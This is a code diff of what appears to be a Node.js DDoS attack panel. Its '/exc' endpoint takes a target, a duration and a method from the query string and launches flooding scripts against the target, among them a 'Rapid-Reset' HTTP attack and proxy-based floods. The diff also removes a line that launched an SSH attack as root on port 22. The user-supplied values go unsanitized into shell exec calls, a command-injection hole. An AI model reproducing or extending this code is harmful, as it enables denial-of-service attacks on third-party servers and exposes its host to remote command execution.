@@ -58,8 +58,6 @@ async function fetchData() {
 
 app.get('/exc', (req, res) => {
   const { target, time, methods } = req.query;
-  const sikat = new url.URL(target);
-  const slurp = sikat.hostname
   res.status(200).json({
     message: 'API request received. Executing script shortly, By JooModdss #Phoenix',
     target,
@@ -75,7 +73,6 @@ app.get('/exc', (req, res) => {
     exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
     
    } else if (methods === 'Phoenix') {
-   exec(`node ./lib/cache/StarsXSsh.js ${slurp} 22 root ${time}`);
    exec(`node ./lib/cache/HTTP-X.js ${target} ${time} 80 10 proxy.txt`)
     exec(`node ./lib/cache/StarsXPidoras.js ${target} ${time} 80 10 proxy.txt`)
    exec(`node ./lib/cache/StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${target}`);
